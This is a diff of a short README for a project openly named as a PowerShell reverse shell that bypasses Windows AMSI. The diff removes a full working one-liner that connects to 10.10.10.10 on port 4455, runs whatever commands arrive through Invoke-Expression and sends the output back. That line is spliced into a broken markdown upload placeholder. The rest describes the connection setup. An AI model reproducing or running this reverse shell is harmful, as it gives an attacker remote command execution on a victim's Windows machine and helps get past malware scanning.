@@ -1,9 +1,6 @@
 # PowerShell_Reverse_Shell_AMSI_Bypass
 This script is a reverse shell written in PowerShell capable of bypassing the Windows AMSI.
 
-[Uplo$h="10.10.10.10";$p=4455;$c=New-Object Net.Sockets.TCPClient($h,$p);$s=$c.GetStream();$r=New-Object IO.StreamReader($s);$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;$b=New-Object System.Byte[] 1024;while($c.Connected){while($s.DataAvailable){$d=$s.Read($b,0,$b.Length);$e=([text.encoding]::UTF8).GetString($b,0,$d-1)}if($c.Connected -and $e.Length -gt 1){$o=try{Invoke-Expression $e 2>&1}catch{$_};$w.Write("$o`n");$e=$null}}$c.Close();$s.Close();$r.Close();$w.Close()
-ading reverse.ps1…]()
-
 1. Connection Setup:
  - It connects to a remote host (10.10.10.10) on port 4455 using a TCP client.
  - A network stream is established for data transmission.
